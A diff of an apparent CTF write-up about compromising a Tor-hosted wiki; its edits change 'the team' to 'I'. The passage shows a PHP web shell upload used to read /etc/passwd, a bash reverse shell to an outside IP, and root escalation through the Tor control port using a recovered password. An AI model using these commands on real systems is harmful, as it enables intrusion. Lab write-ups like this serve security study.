@@ -84,7 +84,7 @@ Investigating the `User:Dax` page revealed the site admin's username and group m
 
 ## Foothold - Malicious File Upload
 
-Rather than relying on the CVE, the team registered a wiki account and found the file upload feature didn't adequately restrict uploaded file types, allowing a PHP web shell to be uploaded directly:
+Rather than relying on the CVE, I registered a wiki account and found the file upload feature didn't adequately restrict uploaded file types, allowing a PHP web shell to be uploaded directly:
 
 ```
 http://.../images/1/1c/Websh.php?cmd=cat%20/etc/passwd
@@ -92,7 +92,7 @@ http://.../images/1/1c/Websh.php?cmd=cat%20/etc/passwd
 
 This returned command execution as `www-data`, confirmed via `/etc/passwd`, which also revealed a notable local account: `relay-operator`.
 
-For easier interaction (since the target was only reachable over Tor), the team switched to querying the web shell through `curl` with SOCKS proxying:
+For easier interaction (since the target was only reachable over Tor), I switched to querying the web shell through `curl` with SOCKS proxying:
 
 ```
 curl --socks5-hostname 127.0.0.1:9050 http://.../Websh.php?cmd=<CMD>
@@ -164,7 +164,7 @@ User www-data may run the following commands on ip-10-17-4-140:
 
 `nyx` is a Tor relay terminal status monitor. Attempts to abuse `nyx` directly as `relay-operator` for command execution were unsuccessful.
 
-Instead, the team pivoted using an SSH private key discovered earlier alongside a reverse shell payload, popping a proper interactive reverse shell rather than relying solely on the web shell:
+Instead, I pivoted using an SSH private key discovered earlier alongside a reverse shell payload, popping a proper interactive reverse shell rather than relying solely on the web shell:
 
 ```
 /bin/bash -c 'exec bash -i &>/dev/tcp/16.52.42.55/443 <&1'
@@ -173,7 +173,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ## Flag 3 - Root via Tor Control Protocol
 
-Following the same Medium article referenced earlier, the team crafted a malicious transport-plugin shell script in `/tmp` and used the recovered control port password to authenticate to the local Tor control port, then configured Tor to execute the script as a server transport plugin - which runs with the privileges of the Tor process (root in this configuration): 
+Following the same Medium article referenced earlier, I crafted a malicious transport-plugin shell script in `/tmp` and used the recovered control port password to authenticate to the local Tor control port, then configured Tor to execute the script as a server transport plugin - which runs with the privileges of the Tor process (root in this configuration): 
 ```
 telnet 127.0.0.1 9051
 AUTHENTICATE "panda23uk"
